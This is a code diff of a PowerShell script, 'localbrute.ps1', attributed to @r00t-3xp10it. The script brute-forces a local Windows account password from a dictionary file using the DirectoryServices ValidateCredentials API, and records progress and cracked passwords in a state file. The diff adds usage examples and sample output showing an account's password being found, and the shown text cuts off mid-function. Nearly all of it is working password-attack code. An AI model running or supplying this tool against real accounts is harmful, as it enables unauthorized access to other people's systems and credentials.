@@ -1,10 +1,47 @@
-﻿Function localbrute {
+﻿<#
+.SYNOPSIS
+   Brute Force User Account Password (LogOn)
+
+   Author: @r00t-3xp10it
+   Tested Under: Windows 10 (18363) x64 bits
+   Required Dependencies: none
+   Optional Dependencies: none
+   PS cmdlet Dev version: v1.0.1
+
+.DESCRIPTION
+   This CmdLet brute forces user account password with the help of native
+   DirectoryServices.AccountManagement API and passwords.txt dicionary file
+
+.NOTES
+   Its mandatory the import of this cmdlet before usage.
+
+.EXAMPLE
+   PS C:\> Import-Module -Name .\localbrute.ps1 -Force
+   Import-Module its mandatory requirement before usage
+
+.EXAMPLE
+   PS C:\> localbrute pedro $Env:TMP\passwords.txt debug
+   Brute force pedro account password using passwords.txt
+
+.OUTPUTS
+   Brute Force [ pedro ] account
+   -----------------------------
+   DEBUG: trying password [0]: toor
+   DEBUG: trying password [1]: pedro
+   DEBUG: trying password [2]: s3cr3t
+   DEBUG: trying password [3]: qwerty
+   Attempt StartTime EndTime  Account Password
+   ------- --------- -------  ------- --------
+   3       18:26:43  18:27:11 pedro   qwerty
+#>
+
+Function localbrute {
 
   param($u,$dct,$debug)
   $d = $dct -replace ".*\\" -replace ".*/"
   
   $ErrorActionPreference = "SilentlyContinue" 
-  $i = ((gc .\localbrute.state | sls "^${u}:.*:True:.*") -split(":"))[3]
+  $i = ((gc .\localbrute.state | sls "^${u}:.*:True:.*") -Split(":"))[3]
   If($i){
     echo "`nPassword for $u account already found: $i"
     return
@@ -12,16 +49,15 @@
   
   $user = [Environment]::UserName
   $TimeStampStart = Get-Date -format "HH:mm:ss"
-  $ii = (gc .\localbrute.state | sls "^${u}:${d}:" | select -last 1) -split(":")
-  $i = $ii[2]/1
-  if ($debug) {Write-Host "`nBrute Force [ $user ] account" -ForeGroundColor Yellow;echo "-----------------------------"}
+  $ii = (gc .\localbrute.state | sls "^${u}:${d}:" | Select -Last 1) -Split(":");$i = $ii[2]/1
+  If($debug){Write-Host "`nBrute Force [ $user ] account" -ForeGroundColor Yellow;echo "-----------------------------"}
   try {
     Add-Type -AssemblyName System.DirectoryServices.AccountManagement 
     $t = [DirectoryServices.AccountManagement.ContextType]::Machine
     $a = [DirectoryServices.AccountManagement.PrincipalContext]::new($t)
-    foreach($p in (gc $dct|where {$_.readcount -gt $i})) {
-      if ($debug) {echo "DEBUG: trying password [${i}]: $p"}
-      if ($a.ValidateCredentials($u,$p)) {
+    ForEach($p in (gc $dct|Where-Object { $_.readcount -gt $i })){
+      If($debug){echo "DEBUG: trying password [${i}]: $p"}
+      If($a.ValidateCredentials($u,$p)){
         echo "${u}:${d}:True:${p}" >> localbrute.state
 
         ## Create Data Table for output
